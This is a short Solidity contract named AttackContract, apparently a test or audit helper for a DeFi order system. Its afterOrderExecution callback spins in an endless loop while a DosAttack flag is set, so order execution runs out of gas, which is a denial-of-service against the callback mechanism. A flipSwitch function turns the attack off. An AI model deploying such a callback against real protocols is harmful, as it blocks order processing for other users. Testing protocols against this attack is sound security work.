pragma solidity ^0.8.0;

import "../order/Order.sol";

contract AttackContract {
  using Order for Order.Props;

  bool public DosAttack = true;

  function flipSwitch() public {
    DosAttack = false;
  }

  function afterOrderExecution(bytes32 key, Order.Props memory order) external {
    uint256 i = 0;
    while(DosAttack) {
      unchecked {
          i++;
      }
    }
  }
}
